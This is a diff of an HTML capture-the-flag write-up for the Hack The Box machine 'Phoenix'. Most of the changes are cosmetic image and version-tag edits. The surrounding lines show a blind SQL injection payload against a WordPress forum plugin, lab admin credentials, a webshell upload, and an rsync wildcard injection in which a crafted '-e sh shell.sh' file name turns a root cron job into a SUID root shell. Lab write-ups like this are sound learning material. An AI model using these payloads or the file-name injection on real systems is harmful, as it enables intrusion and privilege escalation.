@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.3.0.709519492208">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.3.0.709519730028">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 2.3.0">
@@ -21,21 +21,23 @@
     <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/phoenix/">
     <meta property="og:title" content="Phoenix">
     <meta property="og:description" content="IP: 10.10.11.149">
+    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/phoenix/images/image1.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/phoenix/">
     <meta property="twitter:title" content="Phoenix">
     <meta property="twitter:description" content="IP: 10.10.11.149">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/phoenix/images/image1.png">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=2.3.0.709519492208" rel="stylesheet" />
+    <link href="../../../../resources/css/retype.css?v=2.3.0.709519730028" rel="stylesheet" />
 
-    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.3.0.709519492208" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.3.0.709519730028" data-turbo-eval="false" defer></script>
     <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.3.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.3.0.709519492208" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.3.0.709519492208" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.3.0.709519730028" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.3.0.709519730028" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -278,10 +280,18 @@ PORT    STATE SERVICE  VERSION
 <pre class="language-bash"><code v-pre class="language-bash">$ wpscan --url https://phoenix.htb/ --enumerate ap,at,cb,dbe,u --disable-tls-checks</code></pre>
 </doc-codeblock></div>
 <p>Bad decision! I got IP blocked!
-![[phoenix/images/image1.png]]</p>
+<figure class="content-center">
+    <img src="images/image1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Lets manually enumerate the website.
 Looking at the home page source code I could spot some of the plugins metadata. One of them, asgaros-forum, even leak the the version installed:
-![[phoenix/images/image2.png]]</p>
+<figure class="content-center">
+    <img src="images/image2.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Searched for known vulnerabilities and found an unauthenticated <a href="https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1">SQL injection</a> for this plugin. To exploit is very easy, the syntax looks like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">?subscribe_topic=1%20union%20select%201%20and%20sleep(10)</code></pre>
@@ -397,7 +407,11 @@ Jack:</code></pre>
     </h3>
 </doc-anchor-target>
 <p>Login using the administrator credentials <code v-pre>phoenix:phoenixthefirebird14</code> we are stopped by OTP:
-![[phoenix/images/image3.png]]</p>
+<figure class="content-center">
+    <img src="images/image3.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>I tried many ways of circunventing the OTP but nothing works.
 At this point I decided to re-enumerate the plugins installed on wordpress. Maybe we can find some vulnerable plugins. Reading the source code of the home page I could get some of them:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -445,7 +459,11 @@ Shell Uploaded!
 https://phoenix.htb/wp-admin/shell.phtml</code></pre>
 </doc-codeblock></div>
 <p>Browsing to <a href="https://phoenix.htb/wp-admin/shell.phtml">https://phoenix.htb/wp-admin/shell.phtml</a> we get our semi-interactive webshell!
-![[phoenix/images/image4.png]]</p>
+<figure class="content-center">
+    <img src="images/image4.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <doc-anchor-target id="shell-as-wp_user">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#shell-as-wp_user">#</doc-anchor-trigger>
@@ -579,7 +597,11 @@ drwxr-xr-x 10 root root  4096 Jul 31  2020 ..
 -rwxr-xr-x  1 root root 15392 Feb 16 22:27 cron.sh.x</code></pre>
 </doc-codeblock></div>
 <p>It is a binary and I cannot read it in plain-text. So I setup another tty with <code v-pre>pspy</code> running and executed the binary to see what is doing:
-![[phoenix/images/image6.png]]</p>
+<figure class="content-center">
+    <img src="images/image6.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <doc-anchor-target id="rsync-privilege-escalation">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#rsync-privilege-escalation">#</doc-anchor-trigger>
@@ -600,9 +622,17 @@ editor@phoenix:/backups$ chmod +x shell.sh
 editor@phoenix:/backups$ touch &quot;/backups/-e sh shell.sh&quot;</code></pre>
 </doc-codeblock></div>
 <p>The <code v-pre>/backups</code> directory should look like this. Now we just wait for the cronjob:
-![[phoenix/images/image7.png]]</p>
+<figure class="content-center">
+    <img src="images/image7.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>And here it is, we have a copy of  <code v-pre>bash</code> with the SUID bit:
-![[image8.png]]</p>
+<figure class="content-center">
+    <img src="images/image8.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Lets get a root shell:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">editor@phoenix:/tmp$ ./rootbash -p
